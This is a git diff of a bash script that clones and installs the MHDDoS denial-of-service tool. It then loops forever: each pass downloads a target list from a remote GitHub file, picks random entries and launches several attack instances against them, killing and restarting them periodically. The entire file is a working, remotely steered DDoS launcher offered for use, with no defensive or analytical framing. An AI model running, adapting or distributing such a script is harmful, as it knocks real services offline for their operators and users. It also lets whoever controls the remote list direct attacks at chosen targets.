@@ -24,7 +24,6 @@ git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip install -r requirements.txt > /dev/null #(no output on screen)
 
-
 while true
 do
    # Get number of targets in MHDDoS_targets. First 5 strings ommited, those are reserved as comments.
@@ -32,11 +31,11 @@ do
 
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
-   # Get random numbers
+   # Get list of random numbers
    random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
    echo -e "random numbers: " $random_numbers "\n"
    
-   # Print targets on screen
+   # Print all randomly selected targets on screen
    echo "Choosen targets:"
    for i in $random_numbers
    do
@@ -47,13 +46,13 @@ do
    
    sleep 2
    
-   # Launch multiple MHDDoS instances
+   # Launch multiple MHDDoS instances. Targets choosed based on previosly generated list of random numbers.
    for i in $random_numbers
    do
-            # gen randomly pre-choosen line from targets list
+            # Get one line from targets list
             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
             
-            # Cut "command line" from string. Command line is verything before "#" that is used as delimiter for comments purpose.
+            # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
             cmd_line=$(echo $site | awk -F "#" '{print $1}')
             
             echo $cmd_line
@@ -61,11 +60,6 @@ do
             
             python3 ~/MHDDoS/start.py $cmd_line
    done
-
-## check if MHDDoS running. If it's not yet running or was terminated, launch it.
-if [ `ps aux | grep MHDDoS | wc -l` != "2" ]; then
-        echo "MHDDoS not runnint. Time: "$(date +%H":"%M)
-        python3 ~/MHDDoS/start.py $cmd_line
-fi
-sleep $check_interval
+sleep $restart_interval
+ pkill -f start.py
 done
